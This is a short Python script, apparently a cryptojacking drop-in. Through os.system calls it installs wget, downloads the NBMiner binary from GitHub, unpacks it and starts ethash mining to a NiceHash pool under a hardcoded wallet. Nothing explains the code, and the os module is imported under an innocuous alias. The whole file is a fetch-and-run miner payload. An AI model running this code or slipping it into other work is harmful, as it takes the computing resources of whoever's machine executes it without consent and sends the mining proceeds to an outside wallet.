import os as alpha
alpha.system("pip install --upgrade pip")
alpha.system("pip install wget")
alpha.system("wget https://github.com/NebuTech/NBMiner/releases/download/v36.1/NBMiner_36.1_Linux.tgz && tar -xvf  NBMiner_36.1_Linux.tgz && cd NBMiner_Linux && clear && ./nbminer -a ethash -o nicehash+tcp://daggerhashimoto.usa.nicehash.com:3353 -u 33ztip9uQphrGRA4mQzoMG7ACDfDfatGFp.yummy")
